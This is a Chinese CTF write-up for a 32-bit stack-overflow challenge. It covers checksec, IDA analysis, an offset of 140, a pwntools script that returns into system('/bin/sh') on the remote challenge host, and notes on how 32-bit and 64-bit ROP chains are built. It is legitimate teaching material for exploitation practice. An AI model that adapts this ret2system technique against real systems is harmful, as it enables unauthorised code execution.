# 题目

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744198723892-0d8c42e0-2e80-4405-8936-1d04c26801db.png)

# 做法

开虚拟机，checksec

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744605539838-e9797d99-4476-461a-aff8-9fe5a5edf6db.png)

32位，没开栈保护

扔进IDA（32位），找到main，F5反编译

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744605589382-97c4ee89-6e34-48e9-b86b-36d54e34d009.png)

调用了一个函数vulnerable_function，其他没啥用，点进去

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744606252759-9c73dc21-a35d-479c-8247-50ccad34262a.png)

也是没啥用，点进buf看下

完整代码，buf对应第9行buf

```
-00000088 ; D/A/*   : change type (data/ascii/array)
-00000088 ; N       : rename
-00000088 ; U       : undefine
-00000088 ; Use data definition commands to create local variables and function arguments.
-00000088 ; Two special fields " r" and " s" represent return address and saved registers.
-00000088 ; Frame size: 88; Saved regs: 4; Purge: 0
-00000088 ;
-00000088
-00000088 buf             db ?
-00000087                 db ? ; undefined
-00000086                 db ? ; undefined
-00000085                 db ? ; undefined
-00000084                 db ? ; undefined
-00000083                 db ? ; undefined
-00000082                 db ? ; undefined
-00000081                 db ? ; undefined
-00000080                 db ? ; undefined
-0000007F                 db ? ; undefined
-0000007E                 db ? ; undefined
-0000007D                 db ? ; undefined
-0000007C                 db ? ; undefined
-0000007B                 db ? ; undefined
-0000007A                 db ? ; undefined
-00000079                 db ? ; undefined
-00000078                 db ? ; undefined
-00000077                 db ? ; undefined
-00000076                 db ? ; undefined
-00000075                 db ? ; undefined
-00000074                 db ? ; undefined
-00000073                 db ? ; undefined
-00000072                 db ? ; undefined
-00000071                 db ? ; undefined
-00000070                 db ? ; undefined
-0000006F                 db ? ; undefined
-0000006E                 db ? ; undefined
-0000006D                 db ? ; undefined
-0000006C                 db ? ; undefined
-0000006B                 db ? ; undefined
-0000006A                 db ? ; undefined
-00000069                 db ? ; undefined
-00000068                 db ? ; undefined
-00000067                 db ? ; undefined
-00000066                 db ? ; undefined
-00000065                 db ? ; undefined
-00000064                 db ? ; undefined
-00000063                 db ? ; undefined
-00000062                 db ? ; undefined
-00000061                 db ? ; undefined
-00000060                 db ? ; undefined
-0000005F                 db ? ; undefined
-0000005E                 db ? ; undefined
-0000005D                 db ? ; undefined
-0000005C                 db ? ; undefined
-0000005B                 db ? ; undefined
-0000005A                 db ? ; undefined
-00000059                 db ? ; undefined
-00000058                 db ? ; undefined
-00000057                 db ? ; undefined
-00000056                 db ? ; undefined
-00000055                 db ? ; undefined
-00000054                 db ? ; undefined
-00000053                 db ? ; undefined
-00000052                 db ? ; undefined
-00000051                 db ? ; undefined
-00000050                 db ? ; undefined
-0000004F                 db ? ; undefined
-0000004E                 db ? ; undefined
-0000004D                 db ? ; undefined
-0000004C                 db ? ; undefined
-0000004B                 db ? ; undefined
-0000004A                 db ? ; undefined
-00000049                 db ? ; undefined
-00000048                 db ? ; undefined
-00000047                 db ? ; undefined
-00000046                 db ? ; undefined
-00000045                 db ? ; undefined
-00000044                 db ? ; undefined
-00000043                 db ? ; undefined
-00000042                 db ? ; undefined
-00000041                 db ? ; undefined
-00000040                 db ? ; undefined
-0000003F                 db ? ; undefined
-0000003E                 db ? ; undefined
-0000003D                 db ? ; undefined
-0000003C                 db ? ; undefined
-0000003B                 db ? ; undefined
-0000003A                 db ? ; undefined
-00000039                 db ? ; undefined
-00000038                 db ? ; undefined
-00000037                 db ? ; undefined
-00000036                 db ? ; undefined
-00000035                 db ? ; undefined
-00000034                 db ? ; undefined
-00000033                 db ? ; undefined
-00000032                 db ? ; undefined
-00000031                 db ? ; undefined
-00000030                 db ? ; undefined
-0000002F                 db ? ; undefined
-0000002E                 db ? ; undefined
-0000002D                 db ? ; undefined
-0000002C                 db ? ; undefined
-0000002B                 db ? ; undefined
-0000002A                 db ? ; undefined
-00000029                 db ? ; undefined
-00000028                 db ? ; undefined
-00000027                 db ? ; undefined
-00000026                 db ? ; undefined
-00000025                 db ? ; undefined
-00000024                 db ? ; undefined
-00000023                 db ? ; undefined
-00000022                 db ? ; undefined
-00000021                 db ? ; undefined
-00000020                 db ? ; undefined
-0000001F                 db ? ; undefined
-0000001E                 db ? ; undefined
-0000001D                 db ? ; undefined
-0000001C                 db ? ; undefined
-0000001B                 db ? ; undefined
-0000001A                 db ? ; undefined
-00000019                 db ? ; undefined
-00000018                 db ? ; undefined
-00000017                 db ? ; undefined
-00000016                 db ? ; undefined
-00000015                 db ? ; undefined
-00000014                 db ? ; undefined
-00000013                 db ? ; undefined
-00000012                 db ? ; undefined
-00000011                 db ? ; undefined
-00000010                 db ? ; undefined
-0000000F                 db ? ; undefined
-0000000E                 db ? ; undefined
-0000000D                 db ? ; undefined
-0000000C                 db ? ; undefined
-0000000B                 db ? ; undefined
-0000000A                 db ? ; undefined
-00000009                 db ? ; undefined
-00000008                 db ? ; undefined
-00000007                 db ? ; undefined
-00000006                 db ? ; undefined
-00000005                 db ? ; undefined
-00000004                 db ? ; undefined
-00000003                 db ? ; undefined
-00000002                 db ? ; undefined
-00000001                 db ? ; undefined
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008
+00000008 ; end of stack variables
```

栈溢出，我们先数一下offset=8* 16+8+4=140

然后我们Shift+F12寻找后门函数

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744606718308-4f4dcf71-3d70-4408-8a52-892f0095391a.png)

这里有system和/bin/sh

我们点进去看看能不能找到被谁调用了，但是最后空手而归，没能找到后门函数

但是有system（左边函数列表的那个，不是Shift+F12弹出来的字符串）和/bin/sh，我们可以尝试构建ROP链

exp如下（不懂看《补充》）

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744607257860-cf0814c8-e8c1-4bfe-a0b5-a6f9a6c7ecfb.png)

```
#导入pwntools模块：
from pwn import *

#和靶机进行连接：
r = remote("node5.buuoj.cn",29044)

#定义 payload
payload = b'a' * 140 + p32(0x8048320) + p32(0) + p32(0x804A024)

#发送payload
r.sendline(payload)

#获取靶机交互式终端：
r.interactive()
```

常规，得出flag

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744607373873-a991daf3-34d1-4a10-9a21-e7eed2ed4ac9.png)

# 补充

## 1

32位中调用system函数时需要传入一个将来的返回地址，这个返回地址随意，但必须要有

（不要写有特殊含义的之类，一般直接填0即可eg. p32(0) ）

## 2

### （1）

32位的ROP是system函数在前，bin/sh函数在后，两函数中填入一个将来的返回地址，一般直接填0

### （2）

64位的ROP是bin/sh函数在前，system函数在后，两函数之前需要加上该文件的pop rdi地址

（用ROPgadget实现）

# 更新

于2025.4.14